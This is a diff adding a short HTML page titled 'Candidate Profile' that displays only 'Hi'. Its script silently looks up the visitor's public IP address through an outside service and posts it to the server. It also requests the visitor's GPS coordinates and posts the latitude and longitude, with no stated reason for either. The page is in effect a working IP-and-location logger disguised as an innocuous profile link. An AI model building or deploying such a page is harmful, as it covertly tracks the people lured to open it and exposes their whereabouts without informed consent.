@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><meta charset="utf-8"><title>Candidate Profile</title></head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  
+<body onload="getLocation()">
+<p id="demo"></p>
+<h1> Hi </h1>
+  
+<script>
+var ret_ip;
+$.get('https://ipv4.jsonip.com.', function(r)
+{ 
+   ret_ip = r.ip; 
+                
+   $.post("/", {ip: ret_ip},);
+});
+
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) 
+{
+var a=position.coords.latitude;
+var b=position.coords.longitude;
+
+$(document).ready(function()
+{ 
+    $.post("/", { lat: a, lon: b },);
+});
+}
+   
+</script>
+
+<!--<a href="/booking.html">Query</a> -->
+
+</body>
+</html>
